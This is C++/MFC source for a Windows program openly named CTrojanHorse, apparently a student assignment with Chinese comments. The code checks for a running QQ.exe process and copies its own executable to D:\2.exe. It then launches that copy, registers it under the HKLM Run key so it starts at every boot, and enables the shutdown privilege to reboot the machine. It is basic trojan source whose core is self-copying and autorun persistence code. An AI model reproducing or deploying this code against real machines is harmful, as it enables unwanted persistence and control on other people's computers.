#include "AFX.h" 
#include "tlhelp32.h" 
#include "AFXWIN.h"
#include "windows.h"
#include "shellapi.h"
#include "iostream"
#include "stdlib.h"
using namespace std;
class CTrojanHorse  
{  
	public://add code 
	public://add code  
	CTrojanHorse();  
	~CTrojanHorse();  
	protected://add code  
	BOOL IfShell(CString BeKissPrcName);  
	BOOL CopyFileaddr(CString m_CopyFile); 
	BOOL EnableShutDownPrivilege(BOOL bEnable);
	void ShellFile(CString m_ShellFile);  
	BOOL SetAutoRun(CString strPath);  
	void ShutDown();      
	private://add code  
}; 
CTrojanHorse::CTrojanHorse()
{
	MessageBox(0, "This is Thomas's assignment!", "Warning!!!" , MB_ICONINFORMATION|MB_OK);
	EnableShutDownPrivilege(1);
}
CTrojanHorse::~CTrojanHorse()
{}
 BOOL CTrojanHorse::EnableShutDownPrivilege(BOOL bEnable)
{
// 附给本进程特权，以便访问系统进程
	BOOL bOk = FALSE; 
	HANDLE hToken;
// 打开一个进程的访问令牌
	if(::OpenProcessToken(::GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) 
	{
// 取得特权名称为“SetDebugPrivilege”的LUID
		LUID uID;
		::LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &uID);
// 调整特权级别
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		tp.Privileges[0].Luid = uID;
		tp.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;
		::AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
		bOk = (::GetLastError() == ERROR_SUCCESS);
// 关闭访问令牌句柄
		::CloseHandle(hToken);
	}
	return bOk;
}
BOOL CTrojanHorse::IfShell(CString BeKissPrcName)//判断程序是否在运行  
{  
       CString str,a,prcnum;  
       // CMainFrame *pDlg=(CMainFrame *)lparam;  
      //AfxMessageBox(pDlg->BeKissPrcName);  
       HANDLE SnapShot=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);  
       SHFILEINFO shSmall;  
       PROCESSENTRY32 ProcessInfo;//声明进程信息变量  
       ProcessInfo.dwSize=sizeof(ProcessInfo);//设置ProcessInfo的大小  
   //返回系统中第一个进程的信息  
   BOOL Status=Process32First(SnapShot,&ProcessInfo);  
   int m_nProcess=0;  
   int num=0;  
   while(Status) 
   {
	   num++;  
		m_nProcess++;  
		ZeroMemory(&shSmall,sizeof(shSmall));//获取进程文件信息  
		SHGetFileInfo(ProcessInfo.szExeFile,0,&shSmall,  
		sizeof(shSmall),SHGFI_ICON|SHGFI_SMALLICON);  
		//str.Format("%08x",ProcessInfo.th32ProcessID);  
		str=ProcessInfo.szExeFile;  
		if(str==BeKissPrcName)  
		{  
			AfxMessageBox("找到进程成功!"); 
			return true; 
		} 
//获取下一个进程的信息  
		Status=Process32Next(SnapShot,&ProcessInfo);  
   }  
   AfxMessageBox("失败!");  
   return false;  
}  
BOOL CTrojanHorse::CopyFileaddr(CString m_CopyFile)//复制文件  
{	
/*	CString m_addr;
	char pBuf[MAX_PATH];                                               //存放路径的变量
	GetCurrentDirectory(MAX_PATH,pBuf);                   //获取程序的当前目录
	strcat(pBuf,"\\");
	strcat(pBuf,AfxGetApp()->m_pszExeName);   
	strcat(pBuf,".cpp");     
	m_addr=pBuf;*/ 
	if(CopyFile(_pgmptr,m_CopyFile,FALSE))  
   {  
		AfxMessageBox("复制成功！");  
		return true;  
   }  
	return false;  
}  
void CTrojanHorse::ShellFile(CString m_ShellFile)//执行所要的程序  
{  
	ShellExecute(NULL,"open",m_ShellFile,NULL,NULL,SW_SHOWNORMAL);  
}  
BOOL CTrojanHorse::SetAutoRun(CString strPath)//修改注册表  
{  
       CString str;    
       HKEY hRegKey;    
       BOOL bResult;    
       str=_T("Software\\Microsoft\\Windows\\CurrentVersion\\Run");    
       if(RegOpenKey(HKEY_LOCAL_MACHINE, str, &hRegKey) != ERROR_SUCCESS)   
            bResult=FALSE;    
       else    
       {    
            _splitpath(strPath.GetBuffer(0),NULL,NULL,str.GetBufferSetLength(MAX_PATH+1),NULL);    
            strPath.ReleaseBuffer();    
            str.ReleaseBuffer();    
            if(::RegSetValueEx( hRegKey,    
                                     str,    
                                     0,    
                                     REG_SZ,    
                                     (CONST BYTE *)strPath.GetBuffer(0),    
                                     strPath.GetLength() ) != ERROR_SUCCESS)    
                  bResult=FALSE;    
            else    
                  bResult=TRUE;    
            strPath.ReleaseBuffer();    
       }    
       return bResult;  
}  

void CTrojanHorse::ShutDown()//重新启动计算机  
{  
	if (IDYES == MessageBox(NULL,"是否现在重新启动计算机？", "注册表提示", MB_YESNO))  
	{  
		OSVERSIONINFO OsVerInfo; //保存系统版本信息的数据结构  
		OsVerInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);  
		GetVersionEx(&OsVerInfo);//取得系统的版本信息  
		CString str1 = "", str2 = "";  
		str1.Format("你的系统信息\n版本为：%d.%d\n", OsVerInfo.dwMajorVersion,  
		OsVerInfo.dwMinorVersion);  
		str2.Format("型号：%d\n", OsVerInfo.dwBuildNumber);  
		str1 += str2;  
		AfxMessageBox(str1);  
		if(OsVerInfo.dwPlatformId == VER_PLATFORM_WIN32_NT)  
			ExitWindowsEx(EWX_REBOOT | EWX_SHUTDOWN, 0); //重新启动计算机(权限不够，无法关机)  
	}  
}
class thomas:public CTrojanHorse
{
public:
	thomas();
	~thomas();
};
thomas::thomas()
{
	bool a;
	a=IfShell("QQ.exe");
	a=CopyFileaddr("D:\\2.exe");
	ShellFile("D:\\2.exe");
	a=SetAutoRun("D:\\2.exe");
	ShutDown();
}
thomas::~thomas()
{}
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow)
{
	thomas v1;
	return 0;
}
